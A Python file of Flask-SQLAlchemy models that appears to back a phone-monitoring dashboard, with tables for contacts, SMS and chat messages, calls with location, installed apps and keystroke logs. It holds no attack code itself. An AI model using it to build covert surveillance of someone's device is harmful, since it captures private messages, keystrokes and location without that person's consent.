from app import db
from datetime import datetime

class Contact(db.Model):
    __tablename__ = 'contacts'
    contact_id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, nullable=False)
    phone_number = db.Column(db.Text)
    email = db.Column(db.Text)
    last_contacted = db.Column(db.DateTime)

    def to_dict(self):
        return {
            'id': self.contact_id,
            'name': self.name,
            'phone_number': self.phone_number,
            'email': self.email,
            'last_contacted': self.last_contacted.isoformat() if self.last_contacted else None
        }

class SMS(db.Model):
    __tablename__ = 'sms'
    sms_id = db.Column(db.Integer, primary_key=True)
    sms_type = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    from_to = db.Column(db.Text)
    text = db.Column(db.Text)
    location = db.Column(db.Text)

    def to_dict(self):
        return {
            'id': self.sms_id,
            'type': 'SMS',
            'sender': self.from_to,
            'text': self.text,
            'time': self.time.isoformat() if self.time else None,
            'location': self.location,
            'avatar': 'avatar.png'
        }

class ChatMessage(db.Model):
    __tablename__ = 'chatmessages'
    message_id = db.Column(db.Integer, primary_key=True)
    messenger = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    sender = db.Column(db.Text)
    text = db.Column(db.Text)

    def to_dict(self):
        return {
            'id': self.message_id,
            'type': 'Chat',
            'sender': self.sender,
            'text': self.text,
            'time': self.time.isoformat() if self.time else None,
            'messenger': self.messenger,
            'avatar': 'avatar.png'
        }

class Call(db.Model):
    __tablename__ = 'calls'
    call_id = db.Column(db.Integer, primary_key=True)
    call_type = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    from_to = db.Column(db.Text)
    duration = db.Column(db.Integer, default=0)
    location = db.Column(db.Text)

    def to_dict(self):
        return {
            'id': self.call_id,
            'type': self.call_type,
            'contact': self.from_to,
            'time': self.time.isoformat() if self.time else None,
            'duration': self.duration,
            'location': self.location
        }

class InstalledApp(db.Model):
    __tablename__ = 'installedapps'
    app_id = db.Column(db.Integer, primary_key=True)
    application_name = db.Column(db.Text, nullable=False)
    package_name = db.Column(db.Text, nullable=False)
    install_date = db.Column(db.DateTime)

    def to_dict(self):
        return {
            'id': self.app_id,
            'name': self.application_name,
            'package': self.package_name,
            'install_date': self.install_date.isoformat() if self.install_date else None
        }

class Keylog(db.Model):
    __tablename__ = 'keylogs'
    keylog_id = db.Column(db.Integer, primary_key=True)
    application = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    text = db.Column(db.Text)

    def to_dict(self):
        return {
            'id': self.keylog_id,
            'application': self.application,
            'time': self.time.isoformat() if self.time else None,
            'text': self.text
        }
